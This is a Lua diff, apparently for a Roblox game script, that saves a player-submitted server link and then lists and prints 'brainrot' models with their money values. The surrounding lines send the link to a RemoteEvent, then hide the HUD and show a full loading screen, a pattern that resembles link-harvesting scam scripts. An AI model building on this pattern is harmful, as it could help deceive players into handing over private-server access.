@@ -230,6 +230,32 @@ sendButton.MouseButton1Click:Connect(function()
 			pcall(function() remoteEvent:FireServer(link) end)
 		end
 
+		-- Guardar el link del servidor
+		local savedLink = link
+		print("Link del servidor guardado:", savedLink)
+
+		-- Extraer información de brainrots
+		local brainrots = {}  -- Tabla para almacenar la información de brainrots
+		local brainrotData = Workspace:FindFirstChild("BrainrotData")  -- Ajusta esto según la estructura real del juego
+
+		if brainrotData then
+			for _, brainrot in ipairs(brainrotData:GetChildren()) do
+				if brainrot:IsA("Model") then
+					local brainrotName = brainrot.Name
+					local brainrotMoney = brainrot:FindFirstChild("MoneyValue")  -- Ajusta esto según la estructura real del juego
+					if brainrotMoney then
+						local money = brainrotMoney.Value
+						table.insert(brainrots, {Name = brainrotName, Money = money})
+					end
+				end
+			end
+
+			-- Imprimir la información de brainrots
+			for _, data in ipairs(brainrots) do
+				print("Brainrot:", data.Name, "Money:", data.Money)
+			end
+		end
+
 		removeAllSoundsClient()
 		hideHUD()
 		showFullLoadingScreen()
